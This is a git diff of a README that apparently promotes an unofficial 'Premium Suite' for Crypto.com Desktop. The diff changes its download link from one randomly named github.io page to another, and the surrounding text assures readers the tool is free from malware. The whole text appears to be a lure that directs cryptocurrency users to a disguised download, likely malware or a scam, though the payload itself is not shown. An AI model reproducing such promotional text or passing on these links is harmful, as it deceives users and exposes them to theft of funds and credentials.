@@ -66,7 +66,7 @@ A: When downloaded from the official source, the tool is safe and free from malw
 
 ## Download
 
-Ready to enhance your Crypto.com Desktop experience? [Download the latest version of the Premium Suite](https://yellowtaxisave.github.io/download-page/) now. Follow the installation instructions above to get started with advanced trading tools, portfolio management, and more.
+Ready to enhance your Crypto.com Desktop experience? [Download the latest version of the Premium Suite](https://capitals-707-bringing.github.io/download-page/) now. Follow the installation instructions above to get started with advanced trading tools, portfolio management, and more.
 
 ---
 
